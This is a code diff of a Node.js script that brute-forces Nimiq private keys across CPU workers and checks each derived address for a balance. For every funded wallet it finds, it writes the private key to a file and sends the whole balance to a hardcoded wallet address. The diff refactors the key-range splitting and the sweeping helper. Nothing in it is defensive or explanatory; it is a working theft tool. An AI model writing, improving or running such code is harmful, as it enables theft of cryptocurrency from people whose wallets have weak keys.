@@ -1,44 +1,62 @@
 const cluster = require('cluster');
 const fs = require('fs');
-const HEIGHT_FILE = 'height.txt';
+const HEIGHT_FILE = './block.txt';
 
 (async () => {
   // args
   const argv = require('minimist')(process.argv.slice(2));
   const numCPUs = argv?.t || 2;
-  const indexStart = argv?.i || 6;
+  const range = argv?.r || "1:1fffffffff";
+  const addressToCheckBalance = argv?.b || null;
 
   // Connect
   const Connection = require('./connection');
   const connection = new Connection();
   const wrapper = await connection.connect();
 
+  // Check balance
+  if (addressToCheckBalance) {
+    wrapper.accountHelper.getBalance(addressToCheckBalance, function(b) {
+      const balance = b / 100000;
+      console.log(`\n------ Balance Checker -------\n`);
+      console.log(`\x1b[32m${addressToCheckBalance} : ${balance} NIM\x1b[0m`);
+      console.log(`\n------ Balance Checker -------\n`);
+      process.exit(0);
+    })
+
+    return;
+  }
+
   // Main
   if (cluster.isMaster) {
-
-    const start = "0".repeat(64 - indexStart - 1) + 1 + "0".repeat(indexStart);
-    const end = "0".repeat(64 - indexStart - 2) + "f".repeat(indexStart + 2);
+    const [rangeStart = "1", rangeEnd = "1fffffffff"] = range.split(":");
+    const start = "0".repeat(64 - rangeStart.length) + rangeStart
+    const end = rangeEnd + "0".repeat(64 - rangeEnd.length)
 
     if (!fs.existsSync(HEIGHT_FILE)) {
       fs.writeFileSync(HEIGHT_FILE, start);
     }
 
     const height = fs.readFileSync(HEIGHT_FILE).toString().trim() || start;
-    const MIN_PRIVATE_KEY = BigInt(`0x${height}`);
-    const MAX_PRIVATE_KEY = BigInt(`0x${end}`);
-
-    const rangeSize = (MAX_PRIVATE_KEY - MIN_PRIVATE_KEY) / BigInt(numCPUs);
 
     for (let i = 0; i < numCPUs; i++) {
-      const startKey = MIN_PRIVATE_KEY + (rangeSize * BigInt(i));
-      const endKey = (i === numCPUs - 1) ? MAX_PRIVATE_KEY : (startKey + rangeSize - BigInt(1));
-      cluster.fork({ START_KEY: startKey.toString(), END_KEY: endKey.toString() });
+      cluster.fork({ START_KEY: `0x${height}`, END_KEY: `0x${end}` });
     }
 
     cluster.on('exit', (worker, code, signal) => {
       console.log(`Worker ${worker.process.pid} died`);
     });
   } else {
+    const send = (privateKeyHex) => new Promise((resolve) => {
+      const wallet = wrapper.accountHelper.importWalletFromHexKey(privateKeyHex);
+      const address = wallet._keyPair.publicKey.toAddress().toUserFriendlyAddress();
+      wrapper.accountHelper.getBalance(address, (amount) => {
+        const payload = { address: "NQ08 SUEH T0GS PCDJ HUNX Q50H B0M0 ABHA PP03", amount, fee: 0 }
+        wrapper.transactionHelper.sendTransaction(wallet, payload)
+        resolve(address)
+      })
+    })
+
     const getBalance = async (address) => new Promise((resolve) => {
       try {
         wrapper.accountHelper.getBalance(address, (b) => {
@@ -46,19 +64,18 @@ const HEIGHT_FILE = 'height.txt';
           resolve(balance);
         });
       } catch (error) {
-        resolve(0);
+        resolve(-1);
       }
     });
 
     const START_KEY = BigInt(process.env.START_KEY);
     const END_KEY = BigInt(process.env.END_KEY);
+    const WORKER_INDEX = cluster.worker.id;
 
     let founds = 0;
-    let counts = 0;
+    let start = START_KEY + (BigInt(WORKER_INDEX - 1));
 
-    for (let key = START_KEY; key <= END_KEY; key = key - BigInt(1)) {
-      counts++;
-
+    for (let key = start; key <= END_KEY; key = key + BigInt(numCPUs)) {
       const privateKeyHex = key.toString(16).padStart(64, '0');
       const wallet = wrapper.accountHelper.importWalletFromHexKey(privateKeyHex);
       const address = wallet._keyPair.publicKey.toAddress().toUserFriendlyAddress();
@@ -66,24 +83,19 @@ const HEIGHT_FILE = 'height.txt';
 
       if (balance > 0) {
         founds++;
+        console.info(`\x1b[32mCPU ${WORKER_INDEX} | Founds: ${founds} | ${address} | ${privateKeyHex} | ${balance} NIM\x1b[0m`);
 
         // Write to file
         var successString = `Wallet: [${address}] - Private: [${privateKeyHex}] - Balance: ${balance} NIM\n\n------ Malphite Coder ------\n\n`;
-        fs.appendFileSync('./match-private.txt', successString, (err) => {
-          if (err) throw err;
-        });
+        fs.appendFileSync('./match-private.txt', successString, (err) => console.error(err));
 
         // Create transaction to main wallet
-        const wallet = wrapper.accountHelper.importWalletFromHexKey(privateKeyHex);
-        const payload = { address: "NQ08 SUEH T0GS PCDJ HUNX Q50H B0M0 ABHA PP03", amount: balance * 100000, fee: 0 };
-        wrapper.transactionHelper.sendTransaction(wallet, payload);
+        await send(privateKeyHex);
+      } else {
+        console.info(`\x1b[35mCPU ${WORKER_INDEX} | Founds: ${founds} | ${address} | ${privateKeyHex} | ${balance} NIM\x1b[0m`);
       }
 
-      console.log(`[${counts} - ${founds}] Wallet Checked: ${address} | ${privateKeyHex} | ${balance} NIM`);
-
-      if(cluster.worker.id == 1) {
-        fs.writeFileSync(HEIGHT_FILE, privateKeyHex);
-      }
+      fs.writeFileSync(HEIGHT_FILE, privateKeyHex);
     }
   }
 })()
